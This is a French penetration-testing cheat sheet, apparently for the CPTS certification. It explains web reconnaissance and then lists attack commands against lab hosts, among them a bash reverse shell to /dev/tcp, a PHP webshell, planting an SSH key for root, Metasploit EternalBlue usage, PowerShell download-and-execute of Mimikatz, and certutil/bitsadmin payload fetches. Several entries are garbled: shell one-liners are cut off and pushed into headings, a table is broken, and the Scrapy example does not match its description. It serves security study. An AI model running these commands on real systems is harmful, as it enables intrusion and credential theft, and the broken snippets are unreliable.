---
title: "CPTS Cheat Sheet"
date: 2025-05-18 10:00:00 +0200
categories: [Cheatsheet, CPTS]
tags: [cpts, cheatsheet]
toc: true
image: /assets/images/CPTS-logo.png
---

## CPTS Cheat sheet


## Collecte d'Informations

La reconnaissance web est la première étape de toute évaluation de sécurité ou test d'intrusion. C'est similaire à l'enquête initiale d'un détective, qui recueille méticuleusement des indices et des preuves sur une cible avant de formuler un plan d'action. Dans le domaine numérique, cela se traduit par l'accumulation d'informations sur un site web ou une application web pour identifier les vulnérabilités potentielles, les erreurs de configuration de sécurité et les actifs précieux.

Les objectifs principaux de la reconnaissance web tournent autour de l'obtention d'une compréhension complète de l'empreinte numérique de la cible. Cela inclut :

- `Identification des Actifs` : La découverte de tous les domaines associés, sous-domaines et adresses IP fournit une carte de la présence en ligne de la cible.
- `Découverte d'Informations Cachées` : La reconnaissance web vise à découvrir des répertoires, des fichiers et des technologies qui ne sont pas immédiatement apparents et pourraient servir de points d'entrée pour un attaquant.
- `Analyse de la Surface d'Attaque` : En identifiant les ports ouverts, les services en cours d'exécution et les versions des logiciels, vous pouvez évaluer les vulnérabilités et les faiblesses potentielles de la cible.
- `Collecte de Renseignements` : La collecte d'informations sur les employés, les adresses e-mail et les technologies utilisées peut aider dans les attaques d'ingénierie sociale ou l'identification de vulnérabilités spécifiques associées à certains logiciels.

La reconnaissance web peut être effectuée en utilisant des techniques actives ou passives, chacune ayant ses propres avantages et inconvénients :

| Type | Description | Risque de Détection | Exemples |
|------|-------------|---------------------|-----------|
| Reconnaissance Active | Implique une interaction directe avec le système cible, comme l'envoi de sondes ou de requêtes | Plus élevé | Scan de ports, scan de vulnérabilités, cartographie réseau |
| Reconnaissance Passive | Collecte des informations sans interagir directement avec la cible, en s'appuyant sur des données publiquement disponibles | Plus faible | Requêtes sur les moteurs de recherche, recherches WHOIS, énumération DNS, analyse des archives web, réseaux sociaux |

### WHOIS

WHOIS est un protocole de requête et de réponse utilisé pour récupérer des informations sur les noms de domaine, les adresses IP et autres ressources Internet. C'est essentiellement un service d'annuaire qui détaille qui possède un domaine, quand il a été enregistré, les informations de contact, et plus encore. Dans le contexte de la reconnaissance web, les recherches WHOIS peuvent être une source précieuse d'informations, révélant potentiellement l'identité du propriétaire du site web, ses informations de contact et d'autres détails qui pourraient être utilisés pour une enquête plus approfondie ou des attaques d'ingénierie sociale.

Par exemple, si vous vouliez savoir qui possède le domaine `example.com`, vous pourriez exécuter la commande suivante dans votre terminal :

```bash
whois example.com
```

Cela retournerait une multitude d'informations, notamment le registraire, les dates d'enregistrement et d'expiration, les serveurs de noms et les informations de contact du propriétaire du domaine.

Cependant, il est important de noter que les données WHOIS peuvent être inexactes ou intentionnellement masquées, il est donc toujours sage de vérifier les informations à partir de plusieurs sources. Les services de confidentialité peuvent également masquer le véritable propriétaire d'un domaine, rendant plus difficile l'obtention d'informations précises via WHOIS.

### DNS

Le système de noms de domaine (DNS) fonctionne comme le GPS d'Internet, traduisant les noms de domaine conviviaux en adresses IP numériques que les ordinateurs utilisent pour communiquer. Comme un GPS convertit le nom d'une destination en coordonnées, le DNS assure que votre navigateur atteint le bon site web en faisant correspondre son nom avec son adresse IP. Cela élimine la nécessité de mémoriser des adresses numériques complexes, rendant la navigation web fluide et efficace.

La commande `dig` vous permet d'interroger directement les serveurs DNS, récupérant des informations spécifiques sur les noms de domaine. Par exemple, si vous voulez trouver l'adresse IP associée à `example.com`, vous pouvez exécuter la commande suivante :

```bash
dig example.com A
```

Cette commande demande à `dig` d'interroger le DNS pour l'enregistrement `A` (qui fait correspondre un nom d'hôte à une adresse IPv4) de `example.com`. La sortie inclura généralement l'adresse IP demandée, ainsi que des détails supplémentaires sur la requête et la réponse. En maîtrisant la commande `dig` et en comprenant les différents types d'enregistrements DNS, vous acquérez la capacité d'extraire des informations précieuses sur l'infrastructure et la présence en ligne d'une cible.

Les serveurs DNS stockent différents types d'enregistrements, chacun ayant un objectif spécifique :

| Type d'Enregistrement | Description |
|----------------------|-------------|
| A | Fait correspondre un nom d'hôte à une adresse IPv4 |
| AAAA | Fait correspondre un nom d'hôte à une adresse IPv6 |
| CNAME | Crée un alias pour un nom d'hôte, le pointant vers un autre nom d'hôte |
| MX | Spécifie les serveurs de messagerie responsables du traitement des e-mails pour le domaine |
| NS | Délègue une zone DNS à un serveur de noms faisant autorité spécifique |
| TXT | Stocke des informations textuelles arbitraires |
| SOA | Contient des informations administratives sur une zone DNS |

### Sous-domaines

Les sous-domaines sont essentiellement des extensions d'un nom de domaine principal, souvent utilisés pour organiser différentes sections ou services au sein d'un site web. Par exemple, une entreprise pourrait utiliser `mail.example.com` pour son serveur de messagerie ou `blog.example.com` pour son blog.

D'un point de vue de la reconnaissance, les sous-domaines sont incroyablement précieux. Ils peuvent exposer des surfaces d'attaque supplémentaires, révéler des services cachés et fournir des indices sur la structure interne du réseau d'une cible. Les sous-domaines peuvent héberger des serveurs de développement, des environnements de préproduction, ou même des applications oubliées qui n'ont pas été correctement sécurisées.

Le processus de découverte des sous-domaines est connu sous le nom d'énumération de sous-domaines. Il existe deux approches principales pour l'énumération de sous-domaines :

| Approche | Description | Exemples |
|----------|-------------|-----------|
| `Énumération Active` | Interagit directement avec les serveurs DNS de la cible ou utilise des outils pour sonder les sous-domaines | Force brute, transferts de zone DNS |
| `Énumération Passive` | Collecte des informations sur les sous-domaines sans interagir directement avec la cible, en s'appuyant sur des sources publiques | Journaux de Transparence des Certificats (CT), requêtes sur les moteurs de recherche |

L'`énumération active` peut être plus approfondie mais présente un risque de détection plus élevé. À l'inverse, l'`énumération passive` est plus discrète mais peut ne pas découvrir tous les sous-domaines. La combinaison des deux techniques peut augmenter considérablement la probabilité de découvrir une liste complète des sous-domaines associés à votre cible, élargissant votre compréhension de leur présence en ligne et des vulnérabilités potentielles.


#### Force Brute des Sous-domaines

La force brute des sous-domaines est une technique proactive utilisée dans la reconnaissance web pour découvrir des sous-domaines qui ne sont pas immédiatement apparents par des méthodes passives. Elle consiste à générer systématiquement de nombreux noms de sous-domaines potentiels et à les tester contre le serveur DNS de la cible pour voir s'ils existent. Cette approche peut révéler des sous-domaines cachés qui peuvent héberger des informations précieuses, des serveurs de développement ou des applications vulnérables.

L'un des outils les plus polyvalents pour la force brute des sous-domaines est `dnsenum`. Cet outil en ligne de commande puissant combine diverses techniques d'énumération DNS, y compris la force brute basée sur un dictionnaire, pour découvrir les sous-domaines associés à votre cible.

Pour utiliser `dnsenum` pour la force brute des sous-domaines, vous lui fournirez généralement le domaine cible et une liste de mots contenant des noms de sous-domaines potentiels. L'outil interrogera ensuite systématiquement le serveur DNS pour chaque sous-domaine potentiel et signalera ceux qui existent.

Par exemple, la commande suivante tenterait de forcer brutalement les sous-domaines de `example.com` en utilisant une liste de mots nommée `subdomains.txt` :

```bash
dnsenum example.com -f subdomains.txt
```

#### Transferts de Zone

Les transferts de zone DNS, également connus sous le nom de requêtes AXFR (Asynchronous Full Transfer), offrent une mine d'or potentielle d'informations pour la reconnaissance web. Un transfert de zone est un mécanisme de réplication des données DNS entre serveurs. Lorsqu'un transfert de zone réussit, il fournit une copie complète du fichier de zone DNS, qui contient une multitude de détails sur le domaine cible.

Ce fichier de zone liste tous les sous-domaines du domaine, leurs adresses IP associées, les configurations des serveurs de messagerie et autres enregistrements DNS. C'est comme obtenir un plan de l'infrastructure DNS de la cible pour un expert en reconnaissance.

Pour tenter un transfert de zone, vous pouvez utiliser la commande `dig` avec l'option `axfr` (transfert de zone complet). Par exemple, pour demander un transfert de zone depuis le serveur DNS `ns1.example.com` pour le domaine `example.com`, vous exécuteriez :

```bash
dig @ns1.example.com example.com axfr
```

Cependant, les transferts de zone ne sont pas toujours autorisés. De nombreux serveurs DNS sont configurés pour restreindre les transferts de zone aux serveurs secondaires autorisés uniquement. Les serveurs mal configurés, cependant, peuvent permettre des transferts de zone depuis n'importe quelle source, exposant involontairement des informations sensibles.

#### Hôtes Virtuels

L'hébergement virtuel est une technique qui permet à plusieurs sites web de partager une seule adresse IP. Chaque site web est associé à un nom d'hôte unique, qui est utilisé pour diriger les requêtes entrantes vers le bon site. Cela peut être un moyen rentable pour les organisations d'héberger plusieurs sites web sur un seul serveur, mais cela peut également créer un défi pour la reconnaissance web.

Puisque plusieurs sites web partagent la même adresse IP, un simple scan de l'IP ne révélera pas tous les sites hébergés. Vous avez besoin d'un outil qui peut tester différents noms d'hôte contre l'adresse IP pour voir lesquels répondent.

Gobuster est un outil polyvalent qui peut être utilisé pour divers types de force brute, y compris la découverte d'hôtes virtuels. Son mode `vhost` est conçu pour énumérer les hôtes virtuels en envoyant des requêtes à l'adresse IP cible avec différents noms d'hôte. Si un hôte virtuel est configuré pour un nom d'hôte spécifique, Gobuster recevra une réponse du serveur web.

Pour utiliser Gobuster pour forcer brutalement les hôtes virtuels, vous aurez besoin d'une liste de mots contenant des noms d'hôte potentiels. Voici un exemple de commande :

```bash
gobuster vhost -u http://192.0.2.1 -w hostnames.txt
```

Dans cet exemple, `-u` spécifie l'adresse IP cible, et `-w` spécifie le fichier de liste de mots. Gobuster essaiera ensuite systématiquement chaque nom d'hôte dans la liste de mots et signalera ceux qui donnent une réponse valide du serveur web.

#### Journaux de Transparence des Certificats (CT)

Les journaux de Transparence des Certificats (CT) offrent une mine d'informations sur les sous-domaines pour la reconnaissance passive. Ces journaux accessibles publiquement enregistrent les certificats SSL/TLS émis pour les domaines et leurs sous-domaines, servant de mesure de sécurité pour prévenir les certificats frauduleux. Pour la reconnaissance, ils offrent une fenêtre sur des sous-domaines potentiellement négligés.

Le site web `crt.sh` fournit une interface de recherche pour les journaux CT. Pour extraire efficacement les sous-domaines en utilisant `crt.sh` dans votre terminal, vous pouvez utiliser une commande comme celle-ci :

```bash
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

Cette commande récupère les données au format JSON de `crt.sh` pour `example.com` (le `%` est un caractère générique), extrait les noms de domaine en utilisant `jq`, supprime tous les préfixes génériques (`*.`) avec `sed`, et trie et déduplique finalement les résultats.

### Exploration Web

L'exploration web est l'exploration automatisée de la structure d'un site web. Un explorateur web, ou araignée, navigue systématiquement à travers les pages web en suivant les liens, imitant le comportement de navigation d'un utilisateur. Ce processus cartographie l'architecture du site et recueille des informations précieuses intégrées dans les pages.

Un fichier crucial qui guide les explorateurs web est `robots.txt`. Ce fichier réside dans le répertoire racine d'un site web et dicte quelles zones sont interdites aux explorateurs. L'analyse de `robots.txt` peut révéler des répertoires cachés ou des zones sensibles que le propriétaire du site ne souhaite pas voir indexées par les moteurs de recherche.

`Scrapy` est un framework Python puissant et efficace pour les projets d'exploration et de scraping web à grande échelle. Il fournit une approche structurée pour définir les règles d'exploration, extraire les données et gérer divers formats de sortie.

Voici un exemple basique d'araignée Scrapy pour extraire les liens de `example.com` :

```python
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)
```

Après avoir exécuté l'araignée Scrapy, vous aurez un fichier contenant les données extraites (par exemple, `example_data.json`). Vous pouvez analyser ces résultats en utilisant des outils en ligne de commande standard. Par exemple, pour extraire tous les liens :

```bash
jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

Cette commande utilise `jq` pour extraire les liens, `awk` pour isoler les extensions de fichiers, `sort` pour les ordonner, et `uniq -c` pour compter leurs occurrences. En examinant attentivement les données extraites, vous pouvez identifier des motifs, des anomalies ou des fichiers sensibles qui pourraient être intéressants pour une enquête plus approfondie.

### Découverte par Moteurs de Recherche

L'utilisation des moteurs de recherche pour la reconnaissance implique d'exploiter leurs vastes index de contenu web pour découvrir des informations sur votre cible. Cette technique passive, souvent appelée collecte de renseignements en source ouverte (OSINT), peut fournir des informations précieuses sans interagir directement avec les systèmes de la cible.

En utilisant des opérateurs de recherche avancés et des requêtes spécialisées connues sous le nom de "Google Dorks", vous pouvez localiser des informations spécifiques enfouies dans les résultats de recherche. Voici un tableau de quelques opérateurs de recherche utiles pour la reconnaissance web :

| Opérateur | Description | Exemple |
|-----------|-------------|---------|
| `site:` | Restreint les résultats de recherche à un site web spécifique | `site:example.com "réinitialisation de mot de passe"` |
| `inurl:` | Recherche un terme spécifique dans l'URL d'une page | `inurl:admin login` |
| `filetype:` | Limite les résultats aux fichiers d'un type spécifique | `filetype:pdf "rapport confidentiel"` |
| `intitle:` | Recherche un terme dans le titre d'une page | `intitle:"index of" /backup` |
| `cache:` | Affiche la version en cache d'une page web | `cache:example.com` |
| `"terme de recherche"` | Recherche l'expression exacte entre guillemets | `"erreur interne" site:example.com` |
| `OR` | Combine plusieurs termes de recherche | `inurl:admin OR inurl:login` |
| `-` | Exclut des termes spécifiques des résultats de recherche | `inurl:admin -intext:wordpress` |

En combinant créativement ces opérateurs et en élaborant des requêtes ciblées, vous pouvez découvrir des documents sensibles, des répertoires exposés, des pages de connexion et d'autres informations précieuses qui peuvent aider dans vos efforts de reconnaissance.

### Archives Web

Les archives web sont des dépôts numériques qui stockent des instantanés de sites web à travers le temps, fournissant un historique de leur évolution. Parmi ces archives, la Wayback Machine est la ressource la plus complète et accessible pour la reconnaissance web.

La Wayback Machine, un projet de l'Internet Archive, archive le web depuis plus de deux décennies, capturant des milliards de pages web du monde entier. Cette collection massive de données historiques peut être une ressource inestimable pour les chercheurs en sécurité et les enquêteurs.

| Fonctionnalité | Description | Cas d'Utilisation en Reconnaissance |
|----------------|-------------|-------------------------------------|
| `Instantanés Historiques` | Visualiser les versions passées des sites web, y compris les pages, le contenu et les changements de design | Identifier le contenu ou les fonctionnalités passées du site web qui ne sont plus disponibles |
| `Répertoires Cachés` | Explorer les répertoires et fichiers qui ont pu être supprimés ou cachés de la version actuelle du site web | Découvrir des informations sensibles ou des sauvegardes qui ont été involontairement laissées accessibles dans les versions précédentes |
| `Changements de Contenu` | Suivre les changements dans le contenu du site web, y compris le texte, les images et les liens | Identifier les modèles dans les mises à jour de contenu et évaluer l'évolution de la posture de sécurité d'un site web |

En exploitant la Wayback Machine, vous pouvez obtenir une perspective historique sur la présence en ligne de votre cible, révélant potentiellement des vulnérabilités qui ont pu être négligées dans la version actuelle du site web.


### Outils de Base

```bash
**Général**
```

### Se connecter au VPN

```bash
`sudo openvpn user.ovpn`
```

### Afficher notre adresse IP

```bash
`ifconfig` ou `ip a`
```

### Afficher les réseaux accessibles via le VPN

```bash
`netstat -rn`
```

### Se connecter en SSH à un serveur distant

```bash
`ssh user@10.10.10.10`
```

### Se connecter en FTP à un serveur distant

```bash
`ftp 10.129.42.253`
```

```bash
**tmux**
```

### Démarrer tmux

```bash
`tmux`
```

### tmux: préfixe par défaut

```bash
`Ctrl+b`
```

### tmux: nouvelle fenêtre

```bash
`prefix c`
```

### tmux: basculer vers la fenêtre (`1`)

```bash
`prefix 1`
```

### tmux: diviser le panneau verticalement

```bash
`prefix shift+%`
```

### tmux: diviser le panneau horizontalement

```bash
`prefix shift+"`
```

### tmux: basculer vers le panneau de droite

```bash
`prefix ->`
```

```bash
**Vim**
```

### vim: ouvrir `file` avec vim

```bash
`vim file`
```

### vim: entrer en mode `insert`

```bash
`Esc+i`
```

### vim: revenir en mode `normal`

```bash
`Esc`
```

### vim: Couper un caractère

```bash
`x`
```

### vim: Couper un mot

```bash
`dw`
```

### vim: Couper une ligne entière

```bash
`dd`
```

### vim: Copier un mot

```bash
`yw`
```

### vim: Copier une ligne entière

```bash
`yy`
```

### vim: Coller

```bash
`p`
```

### vim: Aller à la ligne numéro 1

```bash
`:1`
```

### vim: Écrire le fichier (sauvegarder)

```bash
`:w`
```

### vim: Quitter

```bash
`:q`
```

### vim: Quitter sans sauvegarder

```bash
`:q!`
```

### vim: Écrire et quitter

```bash
`:wq`
```

### Pentesting

```bash
**Analyse de Services**
```

### Exécuter nmap sur une IP

```bash
`nmap 10.129.42.253`
```

### Exécuter un scan de scripts nmap sur une IP

```bash
`nmap -sV -sC -p- 10.129.42.253`
```

### Lister les différents scripts nmap disponibles

```bash
`locate scripts/citrix`
```

### Exécuter un script nmap sur une IP

```bash
`nmap --script smb-os-discovery.nse -p445 10.10.10.40`
```

### Récupérer la bannière d'un port ouvert

```bash
`netcat 10.10.10.10 22`
```

### Lister les partages SMB

```bash
`smbclient -N -L \\\\10.129.42.253`
```

### Se connecter à un partage SMB

```bash
`smbclient \\\\10.129.42.253\\users`
```

### Scanner SNMP sur une IP

```bash
`snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`
```

### Force brute de la chaîne secrète SNMP

```bash
`onesixtyone -c dict.txt 10.129.42.254`
```

```bash
**Énumération Web**
```

### Exécuter un scan de répertoires sur un site web

```bash
`gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`
```

### Exécuter un scan de sous-domaines sur un site web

```bash
`gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`
```

### Récupérer la bannière du site web

```bash
`curl -IL https://www.inlanefreight.com`
```

### Lister les détails sur le serveur web/certificats

```bash
`whatweb 10.10.10.121`
```

### Lister les répertoires potentiels dans `robots.txt`

```bash
`curl 10.10.10.121/robots.txt`
```

### Voir le code source de la page (dans Firefox)

```bash
`Ctrl+U`
```

```bash
**Exploits Publics**
```

### Rechercher des exploits publics pour une application web

```bash
`searchsploit openssh 7.2`
```

### MSF: Démarrer le Metasploit Framework

```bash
`msfconsole`
```

### MSF: Rechercher des exploits publics dans MSF

```bash
`search exploit eternalblue`
```

### MSF: Commencer à utiliser un module MSF

```bash
`use exploit/windows/smb/ms17_010_psexec`
```

### MSF: Afficher les options requises pour un module MSF

```bash
`show options`
```

### MSF: Définir une valeur pour une option de module MSF

```bash
`set RHOSTS 10.10.10.40`
```

### MSF: Tester si le serveur cible est vulnérable

```bash
`check`
```

### MSF: Exécuter l'exploit sur le serveur cible

```bash
`exploit`
```

```bash
**Utilisation des Shells**
```

### Démarrer un écouteur `nc` sur un port local

```bash
`nc -lvnp 1234`
```

### Envoyer un shell inverse depuis le serveur distant

```bash
`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
```

### /bin/sh -i 2>&1\

```bash
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\
```

### /bin/bash -i 2>&1\

```bash
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\
```

### Se connecter à un shell lié démarré sur le serveur distant

```bash
`nc 10.10.10.1 1234`
```

### Améliorer le shell TTY (1)

```bash
`python -c 'import pty; pty.spawn("/bin/bash")'`
```

### Améliorer le shell TTY (2)

```bash
`Ctrl+Z` puis `stty raw -echo` puis `fg` puis `Entrée` deux fois
```

### Créer un fichier webshell php

```bash
`echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`
```

### Exécuter une commande sur un webshell uploadé

```bash
`curl http://SERVER_IP:PORT/shell.php?cmd=id`
```

```bash
**Élévation de Privilèges**
```

### Exécuter le script `linpeas` pour énumérer le serveur distant

```bash
`./linpeas.sh`
```

### Lister les privilèges `sudo` disponibles

```bash
`sudo -l`
```

### Exécuter une commande avec `sudo`

```bash
`sudo -u user /bin/echo Hello World!`
```

### Passer à l'utilisateur root (si nous avons accès à `sudo su`)

```bash
`sudo su -`
```

### Passer à un utilisateur (si nous avons accès à `sudo su`)

```bash
`sudo su user -`
```

### Créer une nouvelle clé SSH

```bash
`ssh-keygen -f key`
```

### Ajouter la clé publique générée à l'utilisateur

```bash
`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
```

### Se connecter en SSH au serveur avec la clé privée générée

```bash
`ssh root@10.10.10.10 -i key`
```

```bash
**Transfert de Fichiers**
```

### Démarrer un serveur web local

```bash
`python3 -m http.server 8000`
```

### Télécharger un fichier sur le serveur distant depuis notre machine locale

```bash
`wget http://10.10.14.1:8000/linpeas.sh`
```

### Télécharger un fichier sur le serveur distant depuis notre machine locale

```bash
`curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
```

### Transférer un fichier au serveur distant avec `scp` (nécessite un accès SSH)

```bash
`scp linenum.sh user@remotehost:/tmp/linenum.sh`
```

### Convertir un fichier en `base64`

```bash
`base64 shell -w 0`
```

### base64 -d > shell`

```bash
`echo f0VMR...SNIO...InmDwU \
```

### Vérifier le `md5sum` du fichier pour s'assurer qu'il a été converti correctement

```bash
`md5sum shell`
```


## Techniques de Transfert de Fichiers

### Télécharger un fichier avec PowerShell

```bash
`Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`
```

### Exécuter un fichier en mémoire avec PowerShell

```bash
`IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`
```

### Téléverser un fichier avec PowerShell

```bash
`Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`
```

### Télécharger un fichier avec Bitsadmin

```bash
`bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`
```

### Télécharger un fichier avec Certutil

```bash
`certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`
```

### Télécharger un fichier avec Wget

```bash
`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
```

### Télécharger un fichier avec cURL

```bash
`curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
```

### Télécharger un fichier avec PHP

```bash
`php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
```

### Téléverser un fichier avec SCP

```bash
`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`
```

### Télécharger un fichier avec SCP

```bash
`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`
```

### Invoke-WebRequest avec un User Agent Chrome

```bash
`Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`
```

## Fuzzing avec Ffuf

### Aide de ffuf

```bash
`ffuf -h`
```

### Fuzzing de répertoires

```bash
`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`
```

### Fuzzing d'extensions

```bash
`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`
```

### Fuzzing de pages

```bash
`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`
```

### Fuzzing récursif

```bash
`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`
```

### Fuzzing de sous-domaines

```bash
`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`
```

### Fuzzing d'hôtes virtuels

```bash
`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`
```

### Fuzzing de paramètres - GET

```bash
`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`
```

### Fuzzing de paramètres - POST

```bash
`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
```

### Fuzzing de valeurs

```bash
`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
```

### Wordlists

### Directory/Page Wordlist

```bash
`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`
```

### Extensions Wordlist

```bash
`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`
```

### Domain Wordlist

```bash
`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`
```

### Parameters Wordlist

```bash
`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`
```

### Divers

### Ajouter une entrée DNS

```bash
`sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`
```

### Créer une liste de mots séquentielle

```bash
`for i in $(seq 1 1000); do echo $i >> ids.txt; done`
```

### curl avec POST

```bash
`curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'`
```



## Énumération basée sur l'Infrastructure

### jq .`

```bash
`curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \
```

### Scanner chaque adresse IP d'une liste avec Shodan

```bash
`for i in $(cat ip-addresses.txt);do shodan host $i;done`
```

### Énumération basée sur l'Hôte

##### FTP

### Interagir avec le service FTP sur la cible

```bash
`ftp <FQDN/IP>`
```

### Interagir avec le service FTP sur la cible

```bash
`nc -nv <FQDN/IP> 21`
```

### Interagir avec le service FTP sur la cible

```bash
`telnet <FQDN/IP> 21`
```

### Interagir avec le service FTP sur la cible en utilisant une connexion chiffrée

```bash
`openssl s_client -connect <FQDN/IP>:21 -starttls ftp`
```

### Télécharger tous les fichiers disponibles sur le serveur FTP cible

```bash
`wget -m --no-passive ftp://anonymous:anonymous@<target>`
```

##### SMB

### Authentification par session nulle sur SMB

```bash
`smbclient -N -L //<FQDN/IP>`
```

### Se connecter à un partage SMB spécifique

```bash
`smbclient //<FQDN/IP>/<share>`
```

### Interaction avec la cible en utilisant RPC

```bash
`rpcclient -U "" <FQDN/IP>`
```

### Énumération des noms d'utilisateur avec les scripts Impacket

```bash
`samrdump.py <FQDN/IP>`
```

### Énumération des partages SMB

```bash
`smbmap -H <FQDN/IP>`
```

### Énumération des partages SMB en utilisant une authentification par session nulle

```bash
`crackmapexec smb <FQDN/IP> --shares -u '' -p ''`
```

### Énumération SMB avec enum4linux

```bash
`enum4linux-ng.py <FQDN/IP> -A`
```

##### NFS

### Afficher les partages NFS disponibles

```bash
`showmount -e <FQDN/IP>`
```

### Monter le partage NFS spécifique

```bash
`mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock`
```

### Démonter le partage NFS spécifique

```bash
`umount ./target-NFS`
```

##### DNS

### Requête NS vers le serveur de noms spécifique

```bash
`dig ns <domain.tld> @<nameserver>`
```

### Requête ANY vers le serveur de noms spécifique

```bash
`dig any <domain.tld> @<nameserver>`
```

### Requête AXFR vers le serveur de noms spécifique

```bash
`dig axfr <domain.tld> @<nameserver>`
```

### Force brute des sous-domaines

```bash
`dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>`
```

##### SMTP

### Se connecter au service SMTP

```bash
`telnet <FQDN/IP> 25`
```

### Énumérer le service SMTP

```bash
`sudo nmap $ip -sC -sV -p25`
```

### nc -nv -w 6 $ip 25  ; done`

```bash
`for user in $(cat users.txt); do echo VRFY $user \
```

##### IMAP/POP3

### Se connecter au service IMAPS

```bash
`openssl s_client -connect <FQDN/IP>:imaps`
```

### Se connecter au service POP3S

```bash
`openssl s_client -connect <FQDN/IP>:pop3s`
```

Une fois la connexion établie, voici les commandes IMAP et POP3 :

```bash
############
Commandes IMAP
############
# Connexion utilisateur
a LOGIN nom_utilisateur mot_de_passe

# Liste tous les répertoires
a LIST "" *

# Crée une boîte mail avec un nom spécifique
a CREATE "INBOX" 

# Supprime une boîte mail
a DELETE "INBOX" 

# Renomme une boîte mail
a RENAME "ÀLire" "Important"

# Retourne un sous-ensemble de noms parmi ceux que l'utilisateur a déclarés comme actifs ou abonnés
a LSUB "" *

# Sélectionne une boîte mail pour accéder aux messages
a SELECT INBOX

# Quitte la boîte mail sélectionnée
a UNSELECT INBOX

# Récupère les données (parties du message) associées à un message dans la boîte mail
a FETCH <ID> all
# Pour récupérer le corps du message :
a FETCH <ID> BODY.PEEK[TEXT]

# Supprime tous les messages marqués avec le drapeau 'Deleted'
a CLOSE

# Ferme la connexion avec le serveur IMAP
a LOGOUT
```

```bash
############
Commandes POP3
############

# Identifie l'utilisateur
USER nom_utilisateur

# Authentification de l'utilisateur avec son mot de passe
PASS mot_de_passe

# Demande au serveur le nombre d'emails sauvegardés
STAT

# Demande au serveur le nombre et la taille de tous les emails
LIST 

# Demande au serveur de délivrer l'email demandé par son ID
RETR id

# Demande au serveur de supprimer l'email demandé par son ID
DELE id

# Demande au serveur d'afficher ses capacités
CAPA

# Demande au serveur de réinitialiser les informations transmises
RSET

# Ferme la connexion avec le serveur POP3
QUIT
```


**Command**                                               | **Description**                                                                                    |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| sudo nmap $ip -sV -p110,143,993,995 -sC`                  | Footprinting the service                                                                           |
| `curl -v -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made |

After connection is established, see the IMAP and POP3 commands:

##### SNMP

### Interroger les OIDs avec snmpwalk

```bash
`snmpwalk -v2c -c <community string> <FQDN/IP>`
```

### Force brute des chaînes de communauté du service SNMP

```bash
`onesixtyone -c community-strings.list <FQDN/IP>`
```

### Force brute des OIDs du service SNMP

```bash
`braa <community string>@<FQDN/IP>:.1.*`
```

#### SQL

### Analyse du service

```bash
`sudo nmap $ip -sV -sC -p3306 --script mysql*`
```

### Exécuter le script pour vérifier les mots de passe vides

```bash
`sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip`
```

##### MySQL

### Se connecter au serveur MySQL. Il ne doit **pas** y avoir d'espace entre le drapeau '-p' et le mot de passe

```bash
`mysql -u <user> -p<password> -h <IP address>`
```

### Afficher toutes les bases de données

```bash
`show databases;`
```

